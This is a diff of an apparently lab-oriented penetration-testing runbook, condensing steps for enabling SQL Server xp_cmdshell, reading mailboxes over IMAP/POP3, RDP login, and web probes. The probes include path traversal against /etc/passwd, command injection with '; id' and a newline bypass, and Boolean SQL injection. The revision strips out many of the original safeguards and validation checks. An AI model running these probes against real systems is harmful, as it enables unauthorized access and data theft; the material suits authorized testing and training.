-Use `QUIT` in sqlcmd or `exit` in Impacket when done. No write was requested in
-DB-04. Preserve private metadata only in adventure custody, not project memory.
+| Relevant schema or rights | Matching application task. |
+| xp_cmdshell enabled and permitted | **DB-05**. |
+| Disabled, sysadmin, change permitted | **DB-05** with restore. |
+| Denied or unknown | **PAUSE-COVERAGE**. |
 
 ## DB-05. Does the permitted xp_cmdshell path prove its actual OS identity?
 
-Enter only on a verified **Windows SQL Server**, current master context and one
-permitted bounded OS-execution check. This procedure runs `whoami` only. It does
-not deploy a payload, open a callback or create a proxy/login. Existing enabled
-execution can use its granted/proxy context; enabling a disabled setting here
-requires a confirmed sysadmin and separately authorized isolated-lab change.
-
-First record both configuration rows, current SQL identity and all pending values:
+Record both settings first, then enable only what this task changed:
 
 ```sql
-SELECT SUSER_SNAME() AS current_login, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
-SELECT name, value, value_in_use FROM sys.configurations
-WHERE name IN ('show advanced options', 'xp_cmdshell');
-SELECT name, value, value_in_use FROM sys.configurations WHERE value<>value_in_use;
-```
-
-If any pending setting exists, metadata is denied, another administrator is
-changing configuration, or exact restoration is unavailable, do not enable this
-path. `RECONFIGURE` can apply more than the selected option. Continue read-only
-metadata/another lead instead. Record whether **this task** changes each option.
-
-If xp_cmdshell was already enabled, skip all enabling statements. If disabled,
-choose the authorized change only after the checks above. When advanced options
-were initially zero, first run and inspect:
-
-```sql
-EXEC sys.sp_configure 'show advanced options', 1;
-RECONFIGURE;
-```
-
-Then enable only the initially disabled xp_cmdshell:
-
-```sql
-EXEC sys.sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-```
-
-Check the two configuration rows again. Proceed only when the intended values
-and current identity match. A failed setting change requires state inspection
-and restoration, not a retry loop. The one proof is:
-
-```sql
+EXEC sys.sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sys.sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC master.dbo.xp_cmdshell N'whoami';
+```
+
+Restore reverse order afterwards (`xp_cmdshell` 0, then advanced options 0) and recheck `value_in_use`.
+
+| Result | Next |
+| --- | --- |
+| Windows account output | **EXP-01**; **WIN-01** only with a real shell. |
+| Denied or proxy missing | **PAUSE-COVERAGE** after restore. |
+| No trustworthy output | **PAUSE-RECOVERY** until restored. |
+
+# mail_rdp
+
+## MAIL-01. What protocol and TLS context does this endpoint offer?
+
+Implicit TLS:
+
+```bash
+timeout 20s openssl s_client -connect '<TARGET_IP>:<PORT>' -servername '<CERT_HOST>' -verify_hostname '<CERT_HOST>' -CAfile '<CA>' -verify_return_error -crlf -quiet
+```
+
+Add `-starttls smtp|imap|pop3` for STARTTLS. Then send `EHLO x`/`QUIT`, `a1 CAPABILITY`/`a2 LOGOUT`, or `CAPA`/`QUIT`.
+
+| Result | Next |
+| --- | --- |
+| IMAP with mailbox account | **MAIL-02**. |
+| POP3 with account | **MAIL-03**. |
+| SMTP only | **NET-05**. |
+| Certificate failure | **PAUSE-ROUTE**. |
+
+## MAIL-02. Can this identity read one relevant message without changing flags?
+
+```bash
+python3 - <<'PY'
+import getpass, imaplib, ssl, sys
+sys.stdin = open('/dev/tty', 'r', encoding='utf-8')
+host=input('Host: ').strip(); port=int(input('Port: ')); mode=input('implicit/starttls: ').strip()
+ca=input('CA file: ').strip(); user=input('User: ').strip()
+ctx=ssl.create_default_context(cafile=ca)
+m = imaplib.IMAP4_SSL(host, port, ssl_context=ctx) if mode=='implicit' else imaplib.IMAP4(host, port)
+if mode=='starttls': m.starttls(ssl_context=ctx)
+m.login(user, getpass.getpass('Password: '))
+m.select('INBOX', readonly=True)
+_, d = m.uid('search', None, 'ALL'); uids=d[0].split()[-10:]; print(b' '.join(uids).decode())
+uid=input('UID: ').strip()
+_, d = m.uid('fetch', uid, '(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])'); print(d)
+_, d = m.uid('fetch', uid, '(BODY.PEEK[TEXT]<0.4096>)'); print(d)
+m.logout()
+PY
 ```
 
 | Result | Next |
 | --- | --- |
-| Attributed Windows account output | private adventure evidence with SQL login, server and service/proxy identity. Restore below, then **EXP-01** for a reviewed matching interactive-access method. **WIN-01** only after a real shell exists. |
-| Execute denied, proxy missing or process launch fails | Preserve SQL authentication separately from OS failure. **PAUSE-COVERAGE/NET-05** after restoration; do not create a proxy or guess a Windows secret. |
-| Timeout, connection lost or no trustworthy output | OS identity remains unknown. Reconnect through the same verified access context to inspect configuration; **PAUSE-RECOVERY** until changes are restored. |
-| Unexpected identity | Retain actual service/proxy output; no sysadmin-to-SYSTEM assumption or objective claim. Choose its rights question separately. |
-
-Mandatory restoration, even after a failed proof: if **this task enabled**
-xp_cmdshell, disable it first. Do not disable a setting that was enabled on entry:
-
-```sql
-EXEC sys.sp_configure 'xp_cmdshell', 0;
-RECONFIGURE;
-```
-
-If **this task enabled** advanced options, restore it only after xp_cmdshell:
-
-```sql
-EXEC sys.sp_configure 'show advanced options', 0;
-RECONFIGURE;
-```
-
-Finally verify both `value` and `value_in_use` against the exact recorded originals
-and inspect pending differences again. If an unrelated change appeared, stop and
-resolve its owner rather than overwrite another operator's work. Failed/lost
-restoration remains **PAUSE-RECOVERY**, not cleanup confirmed. Disconnect with the
-client's exit command. No target artifact or listener was created; SQL/OS logs and
-audit traces are not deleted. A future callback requires its own process/file
-teardown and independent host/token attribution.
-
-# mail_rdp
-
-Run connection commands in Kali Bash. Replace `<...>` values with the observed
-endpoint and assigned trust/access context. A greeting, valid password and usable
-session are distinct results. Keep private output in adventure data.
-
-## MAIL-01. What protocol and TLS context does this endpoint offer?
-
-Enter with an observed SMTP, IMAP or POP3 service. Replace the assigned IP,
-certificate hostname, port and CA path in the matching command.
-
-For **observed implicit TLS**, connect directly:
-
-```bash
-timeout 20s openssl s_client -connect '<authorized-target-ip>:<observed-mail-port>' \
-  -servername '<assigned-certificate-hostname>' -verify_hostname '<assigned-certificate-hostname>' \
-  -CAfile '<absolute-path-to-assigned-lab-ca-file>' -verify_return_error -crlf -quiet
-```
-
-For **observed STARTTLS**, use its protocol name, `smtp`, `imap` or `pop3`:
-
-```bash
-timeout 20s openssl s_client -connect '<authorized-target-ip>:<observed-mail-port>' \
-  -starttls '<smtp-or-imap-or-pop3>' -servername '<assigned-certificate-hostname>' \
-  -verify_hostname '<assigned-certificate-hostname>' -CAfile '<absolute-path-to-assigned-lab-ca-file>' \
-  -verify_return_error -crlf -quiet
-```
-
-After successful certificate verification, type only the applicable capability
-and quit commands into that protocol session. No authentication is needed here.
-
-SMTP:
-
-```text
-EHLO workbench.invalid
-QUIT
-```
-
-IMAP:
-
-```text
-a1 CAPABILITY
-a2 LOGOUT
-```
-
-POP3:
-
-```text
-CAPA
-QUIT
-```
-
-| Result | Next action |
-| --- | --- |
-| Attributable IMAP greeting/capabilities and permitted mailbox identity | Record implicit TLS versus STARTTLS and endpoint; **MAIL-02**. |
-| SMTP response only | Record the response/name clue; **NET-05**. Do not send mail or test relay permission merely to complete the task. |
-| POP3 response and permitted account | Record protocol/context; **MAIL-03** for one bounded read. MAIL-02 remains IMAP-specific. |
-| No permitted mailbox identity | **NET-05**, retain access prerequisite without account guessing. |
-| Certificate/hostname error | **PAUSE-ROUTE**, correct assigned trust/name. Do not add `-no-CAfile` or ignore verification failure. |
-| TLS/protocol mismatch | **NET-03**, check observed mode before selecting direct TLS versus STARTTLS. |
-| Timeout or connection failure | `ip route get '<authorized-target-ip>'`; fix route at **PAUSE-ROUTE**, otherwise **NET-03**. A wrapper timeout is not absence. |
-
-The 20-second wrapper is a capability-check budget. It may expire while you read;
-record that instead of treating an unfinished command as a negative result.
-
-## MAIL-02. Can this identity read one relevant message without changing flags?
-
-Enter with an authorized IMAP mailbox account and the verified TLS mode from
-MAIL-01. Hostname resolution must reach the assigned endpoint; use **DNS-01** if
-not. This interactive Python block asks for context and password without putting
-the password in process arguments. It lists at most ten recent UID candidates,
-reads one header and optionally the first 4096 bytes of that message's text.
-
-```bash
-python3 - <<'PY'
-import getpass
-import imaplib
-import ssl
-import sys
-
-# The here-document supplies the program; prompts need the controlling terminal.
-sys.stdin = open('/dev/tty', 'r', encoding='utf-8')
-
-host = input('Assigned IMAP hostname: ').strip()
-port = int(input('Observed port: '))
-mode = input('Verified TLS mode [implicit/starttls]: ').strip()
-ca = input('Absolute assigned CA file: ').strip()
-user = input('Supplied mailbox user: ').strip()
-context = ssl.create_default_context(cafile=ca)
-mail = None
-try:
-    if mode == 'implicit':
-        mail = imaplib.IMAP4_SSL(host, port, ssl_context=context, timeout=15)
-    elif mode == 'starttls':
-        mail = imaplib.IMAP4(host, port, timeout=15)
-        mail.starttls(ssl_context=context)
-    else:
-        raise ValueError('Use only implicit or starttls; no plaintext fallback')
-    mail.login(user, getpass.getpass('Supplied password: '))
-    folder = input('One permitted folder [INBOX]: ').strip() or 'INBOX'
-    status, data = mail.select(folder, readonly=True)
-    if status != 'OK':
-        raise RuntimeError(f'Folder selection failed: {status}')
-    status, data = mail.uid('search', None, 'ALL')
-    if status != 'OK' or not data or data[0] is None:
-        raise RuntimeError(f'UID search failed: {status}')
-    candidates = data[0].split()[-10:]
-    print('Recent candidate UIDs:', b' '.join(candidates).decode('ascii'))
-    uid = input('One UID from that list, or blank to stop: ').strip()
-    if uid:
-        if not uid.isascii() or not uid.isdecimal() or uid.encode() not in candidates:
-            raise ValueError('Choose exactly one listed UID')
-        status, data = mail.uid('fetch', uid, '(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])')
-        print('Header status:', status, 'Response:', repr(data))
-        if status == 'OK' and input('Read up to 4096 text bytes? [yes/no]: ') == 'yes':
-            status, data = mail.uid('fetch', uid, '(BODY.PEEK[TEXT]<0.4096>)')
-            print('Text status:', status, 'Response:', repr(data))
-finally:
-    if mail is not None:
-        try:
-            mail.logout()
-        except (imaplib.IMAP4.error, OSError) as error:
-            print('Logout unconfirmed:', type(error).__name__)
-PY
-```
-
-| Result | Next action |
-| --- | --- |
-| Relevant header/text bytes returned | Record folder, UID and inspected byte extent privately; **NET-05** for the specific supported endpoint/identity clue. Do not use disclosed credentials elsewhere without permission. |
-| Login denied | Record authentication stage; **NET-05**, no guessing or repeated account attempts. |
-| Folder/search/fetch denied or no literal message bytes | Retain the exact operation failure; **NET-05**. An `OK` response alone does not prove useful message content. |
-| Empty UID list/no relevant item | **NET-05**. Ten candidates and one message are not a full mailbox search. |
-| TLS/transport exception | **MAIL-01**, preserve trust/connection stage rather than reporting password failure. |
-| Logout unconfirmed | Close the local client and record that target-side logout is unconfirmed. Do not infer the mailbox session ended. |
+| Header or text returned | **NET-05**. |
+| Login denied | **NET-05**. |
+| Fetch denied | **NET-05**. |
+| TLS error | **MAIL-01**. |
 
 ## MAIL-03. Can this permitted POP3 identity read one message without deleting it?
 
-Enter only after MAIL-01 identified POP3 and its verified implicit-TLS or
-STARTTLS mode. This Python client prompts for the password, lists the mailbox,
-reads the header and up to 80 body lines of one selected message with `TOP`,
-and never issues `DELE`.
+Same shape, using `poplib` and `TOP`, no `DELE`.
 
 ```bash
 python3 - <<'PY'
-import getpass
-import poplib
-import ssl
-import sys
-
+import getpass, poplib, ssl, sys
 sys.stdin = open('/dev/tty', 'r', encoding='utf-8')
-host = input('Assigned POP3 hostname: ').strip()
-port = int(input('Observed port: '))
-mode = input('Verified TLS mode [implicit/starttls]: ').strip()
-ca = input('Absolute assigned CA file: ').strip()
-user = input('Supplied mailbox user: ').strip()
-context = ssl.create_default_context(cafile=ca)
-mail = None
-try:
-    if mode == 'implicit':
-        mail = poplib.POP3_SSL(host, port, context=context, timeout=15)
-    elif mode == 'starttls':
-        mail = poplib.POP3(host, port, timeout=15)
-        mail.stls(context)
-    else:
-        raise ValueError('Use only implicit or starttls; no plaintext fallback')
-    mail.user(user)
-    mail.pass_(getpass.getpass('Supplied password: '))
-    count, _ = mail.stat()
-    print('Message count:', count)
-    response, listings, _ = mail.list()
-    print('LIST status:', response.decode(errors='replace'))
-    candidates = [line.split()[0] for line in listings[-10:]]
-    print('Recent candidate numbers:', b' '.join(candidates).decode('ascii'))
-    selected = input('One number from that list, or blank to stop: ').strip().encode()
-    if selected:
-        if selected not in candidates:
-            raise ValueError('Choose exactly one listed message number')
-        response, lines, octets = mail.top(int(selected), 80)
-        print('TOP status:', response.decode(errors='replace'), 'octets:', octets)
-        print(b'\\n'.join(lines).decode('utf-8', errors='replace'))
-finally:
-    if mail is not None:
-        try:
-            mail.quit()
-        except (poplib.error_proto, OSError) as error:
-            print('POP3 logout unconfirmed:', type(error).__name__)
+host=input('Host: ').strip(); port=int(input('Port: ')); mode=input('implicit/starttls: ').strip()
+ca=input('CA file: ').strip(); user=input('User: ').strip()
+ctx=ssl.create_default_context(cafile=ca)
+p = poplib.POP3_SSL(host, port, context=ctx) if mode=='implicit' else poplib.POP3(host, port)
+if mode=='starttls': p.stls(ctx)
+p.user(user); p.pass_(getpass.getpass('Password: ')); print(p.stat())
+_, items, _ = p.list(); nums=[i.split()[0] for i in items[-10:]]; print(b' '.join(nums).decode())
+n=input('Number: ').strip()
+_, lines, _ = p.top(int(n), 80); print(b'\n'.join(lines).decode(errors='replace'))
+p.quit()
 PY
 ```
 
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| One permitted message header and up to 80 body lines are read | Record message number, inspected extent and protocol context privately; **NET-05** for the service identity. |
-| Login denied | Record the authentication stage; **NET-05**, with no guessing or repeated attempts. |
-| `LIST`/`TOP` denied, empty or unstable | Preserve the exact POP3 operation result; **NET-05**. A successful login alone is not useful message access. Do not fall back to full `RETR` automatically. |
-| TLS/hostname/STARTTLS failure | **MAIL-01**, preserving the trust and protocol stage. Do not fall back to plaintext. |
-| Logout is unconfirmed | Close the local client and record that target-side logout is unconfirmed. Do not infer the mailbox session ended. |
-
-This procedure intentionally avoids `DELE`, `RSET`, full retrieval and message
-forwarding. Remove any private local output after the evidence decision.
+| Message read | **NET-05**. |
+| Login denied | **NET-05**. |
+| TOP denied | **NET-05**. |
 
 ## RDP-01. Can the supplied account open the assigned desktop?
 
-Enter with observed RDP, one permitted account and the assigned host trust context.
-In a graphical Kali login, run:
-
 ```bash
-xfreerdp3 /v:'<assigned-hostname-or-ip>:<observed-rdp-port>' /u:'<supplied-account>'
+xfreerdp3 /v:'<TARGET_IP>:<PORT>' /u:'<ACCOUNT>'
 ```
 
-If only `xfreerdp` is installed, use that name instead after checking its `/help`
-for the same options. A missing client is a Kali setup issue, not a target result.
-For a supplied domain account, add `/d:'<supplied-domain>'`. For a local account,
-use the supplied host-local namespace; do not assume a domain form. Omit `/p` so
-the client prompts. No drive, clipboard, printer or agent forwarding is requested.
+Add `/d:'<DOMAIN>'` for a domain account.
 
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| Usable desktop opens | **RDP-02**, verify host and account before WIN-01 checks the token. |
-| Certificate prompt/error | Check the assigned CA or independently supplied fingerprint before acceptance. Unresolved trust: **PAUSE-ROUTE**. Never use `/cert:ignore` as the default. |
-| Authentication denied | Record identity namespace and error; **NET-05**. |
-| Account accepted but session policy/access denied | Record policy stage, not “wrong password”; **NET-05**. |
-| Connection/name failure | Check assigned name at **DNS-01** or endpoint at **NET-03**. |
-| No graphical display or client missing | Run from the native Kali desktop terminal after approved client setup. Workbench's SSH shell need not have `DISPLAY`; do not guess X server credentials. |
-| No permitted account or session disruption not allowed | **NET-05**. Do not log in just to complete the checklist. |
+| Desktop opens | **RDP-02**. |
+| Certificate prompt | Check the CA or fingerprint; otherwise **PAUSE-ROUTE**. |
+| Login denied | **NET-05**. |
+| Connection failure | **DNS-01** or **NET-03**. |
 
 ## RDP-02. Is this desktop on the assigned host with the expected account?
-
-Inside the remote desktop, open its normal PowerShell and run:
 
 ```powershell
 hostname
 whoami
 ```
 
-Run `ipconfig` only if the host name does not settle the assigned-host question:
-
-```powershell
-ipconfig
-```
-
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| Host and account corroborate the assigned desktop | **WIN-01** for the current token. Reuse the host/account observation; do not repeat it unless the session changes. |
-| Host/address differs unexpectedly | **PAUSE-ROUTE**, clarify NAT/backend/assignment before host work. |
-| Some checks denied/unavailable | Preserve partial evidence; **WIN-01** only when the host and account still correlate, otherwise **GAP-ACCESS**. |
-| Desktop usable but no attributable host shell | **GAP-ACCESS**, do not infer host-level access from the desktop alone. |
-| Session drops or identity changes | **RDP-01** for the permitted reconnect, then repeat verification. |
+| Host and account match | **WIN-01**. |
+| Host differs | **PAUSE-ROUTE**. |
+| Host unattributable | **GAP-ACCESS**. |
 
-When finished, close the FreeRDP window to **disconnect**. Confirm the client exits.
-Do not select Windows Sign out unless the lab requires ending the target-side user
-session; sign-out can terminate target-side processes. A disconnected session can
-remain on the server. If the lab requires ending that session, use its normal
-sign-out procedure; otherwise record the disconnect and move on.
+Continue with the Windows token check at [WIN-01](./win-01.md).
 
 # web_input
 
-Run in **Kali Bash**. Start from the working request at WEB-06/08. Replace the
-URL and field in each command, preserving its scheme, hostname, port and required
-fields. The GET examples below assume one ordinary public field. Add each actual
-required non-secret field with `--data-urlencode 'name=value'` to every request.
-These shell examples use values without literal single quotes. For other values,
-replay the captured request in the normal request editor instead of guessing
-shell escaping.
-For an existing WEB-09 session, add `--header '@/exact/private/session.headers'`
-only after manually checking the same origin. No redirect is followed.
-
-Require curl 8.4+ for the response-size bound. Choose one decision and a new
-private directory name; repeat it in its output and cleanup commands. Stop if
-directory creation fails. Run requests one at a time. Inspect the curl exit and
-HTTP status before interpreting the body; stop on transport/TLS failure, partial
-output, login/other-origin redirect, 429 or instability. Unknown POST/JSON/CSRF
-context returns to WEB-08 rather than forcing a GET. Keep secrets and responses
-in protected adventure storage, not this checklist.
+Start from the working request at WEB-06/08. Form stays POST: repeat every required field and a fresh CSRF value. For an existing session add `--header '@<HEADERS>'` only on the same origin.
 
 ## WREAD-01. Can a file-controlled input read an unintended local file?
 
-Enter only when the observed feature actually reads a named file and the assigned
-lab permits this test. Relative traversal and absolute-path handling are distinct
-contexts; do not assume one from the other. The existing comparison below needs
-an actual ordinary file value. If none is known, do not invent a baseline merely
-to fill the template; retain that missing request context at **WEB-06**.
-Use one OS-matched non-secret file probe. Linux example:
+Enter when the feature actually reads a named file.
 
 ```bash
-mkdir -m 700 -- './wread-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ORDINARY_FILE>' -o baseline.body -w 'HTTP %{http_code}\n' '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=../../../../etc/passwd' -o probe.body -w 'HTTP %{http_code}\n' '<URL>'
+sed -n '1,40p' probe.body | cat -v
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-file-value>' \
-  --output './wread-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
+For Windows handling use `..\..\..\..\Windows\win.ini`.
 
-If the baseline is intact, run the changed path and one missing-file control:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=../../../../etc/passwd' \
-  --output './wread-<same-run-id>/probe.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=../../../../etc/owb-missing-<unique-suffix>' \
-  --output './wread-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-For evidenced Windows file handling, replace both probe/control with that OS's
-paths in those commands, for example `..\..\..\..\Windows\win.ini` and one
-uniquely named nonexistent sibling. Do not send Linux paths solely because Kali
-is Linux. A missing legacy Windows file is not evidence against traversal.
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Probe returns structured content matching the selected file, different from ordinary file and missing control | Record exact request, file and identity. private adventure evidence, then **NET-05** for one justified configuration/service lead. File read is not execution. |
-| Response only reflects the supplied path, gives the same document or shows an error | No verified file read. Check observed path/format at **WEB-06**; a needed encoding/root-depth fact to **PAUSE-COVERAGE**. |
-| Probe and missing control both return the same generic body | Retain inconclusive result. **WEB-01** or another observed field, not “no traversal anywhere.” |
-| 403 with current identity still verified | Record denied read at this path; **NET-05**. No automatic alternate-file sweep. |
-| Session/transport/limit changes | **WEB-09** for account context; **PAUSE-COVERAGE** for incomplete comparison. |
-
-For completed responses, inspect locally with controls escaped:
-
-```bash
-sed -n '1,40p' './wread-<same-run-id>/probe.body' | cat -v
-sha256sum -- './wread-<same-run-id>/baseline.body' './wread-<same-run-id>/probe.body' './wread-<same-run-id>/control.body'
-```
-
-Preserve useful evidence privately, then remove only these local response files:
-
-```bash
-rm -i -- './wread-<same-run-id>/baseline.body' './wread-<same-run-id>/probe.body' './wread-<same-run-id>/control.body'
-rmdir -- './wread-<same-run-id>'
-```
-
-No remote file modification occurred in this procedure.
-Any inferred password/config path is a new targeted question, not a bulk-read list.
+| File content, distinct from the baseline | **NET-05** for the config or service it names. |
+| Reflected path or unchanged page | **WEB-06** for the real parameter context. |
+| 403 with a verified identity | **NET-05**; no file sweep. |
+| Transport or session failure | **WEB-09** / **PAUSE-COVERAGE**. |
 
 ## WEXEC-01. Does a POSIX command-backed input execute an extra command?
 
-Enter when the feature plausibly invokes a POSIX command and an ordinary value
-works. This example applies to an **unquoted** argument context. It is not a
-universal Windows or quoted-string payload. Keep the original value in scope.
-Reuse the exact working request shape from WEB-06 or WEB-08. A form stays POST;
-repeat every required hidden, selector, action and submit field, and use a fresh
-anti-CSRF value. Change only the field under review.
+Enter when an ordinary value works and the argument looks unquoted.
 
 ```bash
-mkdir -m 700 -- './wexec-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; printf OWB_%s <NONCE>' -o probe.body -w 'HTTP %{http_code}\n' '<URL>'
+grep -F 'OWB_<NONCE>' probe.body
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; id' -o verify.body -w 'HTTP %{http_code}\n' '<URL>'
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-authorized-value>' \
-  --output './wexec-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
+`;` rejected: retry once with a literal newline (`--data-urlencode $'...\nprintf OWB_%s <NONCE>'`).
 
-With an intact baseline, replace `<nonce>` with 8-32 alphanumeric characters.
-The server-side printf assembles `OWB_<nonce>`, absent as contiguous request text:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-authorized-value>; printf OWB_%s <nonce>' \
-  --output './wexec-<same-run-id>/probe.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-grep -F -- 'OWB_<same-nonce>' './wexec-<same-run-id>/probe.body' | head -n 5 | cat -v
-```
-
-For a verified URL-form POST, use this shape for baseline, probe and identity
-requests instead of the GET blocks above. Repeat `--data-urlencode` for every
-captured required field; never silently convert the request to GET:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 --request POST \
-  --data-urlencode '<field>=<ordinary-authorized-value>' \
-  --data-urlencode '<required-field>=<captured-value>' \
-  --data-urlencode '<submit-field>=<captured-submit-value>' \
-  --output './wexec-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<same-observed-endpoint>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 --request POST \
-  --data-urlencode '<field>=<ordinary-authorized-value>; printf OWB_%s <nonce>' \
-  --data-urlencode '<required-field>=<captured-value>' \
-  --data-urlencode '<submit-field>=<captured-submit-value>' \
-  --output './wexec-<same-run-id>/probe.body' --write-out 'HTTP %{http_code}\n' '<same-observed-endpoint>'
-```
-
-If the marker comparison supports shell interpretation but `;` and `&&` are
-rejected, test one literal newline early through the same request rather than
-characterizing every filter. ANSI-C quoting below makes the newline a request
-byte; it is not the two visible characters `\` and `n`:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 --request POST \
-  --data-urlencode $'<field>=<ordinary-authorized-value>\nprintf OWB_%s <nonce>' \
-  --data-urlencode '<required-field>=<captured-value>' \
-  --data-urlencode '<submit-field>=<captured-submit-value>' \
-  --output './wexec-<same-run-id>/newline.body' --write-out 'HTTP %{http_code}\n' '<same-observed-endpoint>'
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Assembled marker plus native `uid/gid/groups` output is distinct from reflection and belongs to the assigned application process | With observed Linux, unquoted input and a reviewed Bash or other available runtime, **WEXEC-04**; otherwise **EXP-01** for a separately reviewed foothold method. |
-| Input is reflected, marker absent, validation error or both responses unchanged | Execution not verified. If shell interpretation is otherwise evidenced and `;` or `&&` was rejected, use the single literal-newline comparison above. Otherwise return to **WEB-06/WEB-08** for the actual argument/quoting context, or **PAUSE-COVERAGE** for a missing fact. |
-| Curl failed, output truncated or session changed | Preserve ambiguity, **PAUSE-COVERAGE** or **WEB-09**. No retry loop. |
-| Marker appears in an unrelated cached response or wrong host | **WEB-01** to correct attribution. |
-
-Only after the marker result supports command execution, check effective identity
-through the same confirmed carrier:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<ordinary-authorized-value>; id' \
-  --output './wexec-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-sed -n '1,40p' './wexec-<same-run-id>/verify.body' | cat -v
-```
-
-For the verified URL-form POST, retain the same required fields for identity:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 --request POST \
-  --data-urlencode '<field>=<ordinary-authorized-value>; id' \
-  --data-urlencode '<required-field>=<captured-value>' \
-  --data-urlencode '<submit-field>=<captured-submit-value>' \
-  --output './wexec-<same-run-id>/verify.body' --write-out 'HTTP %{http_code}\n' '<same-observed-endpoint>'
-```
-
-Read a real `uid/gid/groups` result in command output, not just reflected `id` text.
-Record execution as this application's process context. It does not establish
-an interactive shell, host-root or objective completion. Matching verified Linux
-unquoted input with an observed Bash path can use **WEXEC-04** for a manually
-selected shell attempt. Other contexts use **EXP-01** for their reviewed foothold
-method, **EXP-03** only when a real session needs verification,
-and private adventure evidence for the attributed proof. No callback or payload deployment is
-included here. After custody, remove only the local response files:
-
-```bash
-rm -i -- './wexec-<same-run-id>/baseline.body' './wexec-<same-run-id>/probe.body' './wexec-<same-run-id>/verify.body'
-rmdir -- './wexec-<same-run-id>'
-```
-
-If captured construction instead supports a quoted POSIX argument, **WEXEC-02**
-provides its independent GET/form comparison. Evidenced Windows cmd input uses
-**WEXEC-03**. Neither is an automatic retry after an unquoted probe fails.
+| Marker plus real uid/gid | **WEXEC-04** if Bash is observed, otherwise **EXP-01**. |
+| Reflected only, marker absent | **WEB-06** / **PAUSE-COVERAGE**. |
+| Quoted argument context | **WEXEC-02**. |
+| Windows cmd context | **WEXEC-03**. |
 
 ## WSQL-01. Does a numeric read-only query respond to Boolean SQL logic?
 
-Enter with an observed numeric identifier in a read-only lookup whose ordinary
-result is recognizable. Do not apply this to login, deletion, update or an unknown
-state-changing request. This numeric-context example does not handle quoted values,
-different query positions, every engine or blind extraction.
-
 ```bash
-mkdir -m 700 -- './wsql-<unique-run-id>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ID> AND 1=1' -o true.body -w 'HTTP %{http_code}\n' '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<ID> AND 1=2' -o false.body -w 'HTTP %{http_code}\n' '<URL>'
 ```
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<working-numeric-id>' \
-  --output './wsql-<same-run-id>/baseline.body' --write-out 'HTTP %{http_code}\n' '<observed-endpoint-without-query>'
-```
+Ordinary and true must match, false must differ.
 
-With a stable baseline, send one true/false pair and restore the ordinary control:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<working-numeric-id> AND 1=1' \
-  --output './wsql-<same-run-id>/true.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<working-numeric-id> AND 1=2' \
-  --output './wsql-<same-run-id>/false.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
-```
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --get --data-urlencode '<field>=<working-numeric-id>' \
-  --output './wsql-<same-run-id>/control.body' --write-out 'HTTP %{http_code}\n' '<same-endpoint-without-query>'
